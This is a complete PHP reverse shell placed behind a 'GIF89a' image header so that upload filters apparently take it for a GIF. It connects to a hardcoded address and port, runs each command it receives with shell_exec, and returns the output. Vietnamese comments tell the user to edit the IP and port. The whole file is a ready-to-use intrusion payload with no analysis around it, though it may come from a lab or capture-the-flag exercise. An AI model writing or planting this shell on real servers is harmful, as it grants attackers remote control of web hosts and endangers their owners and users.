GIF89a
<?php
set_time_limit(0);
$ip = '172.25.72.115';  // Chỉnh cái này
$port = 1234;           // Chỉnh cả cái này
$sock = fsockopen($ip, $port);
while(!feof($sock)) {
    $command = fgets($sock, 1024);
    $output = shell_exec($command);
    fwrite($sock, $output);
}
fclose($sock);
?>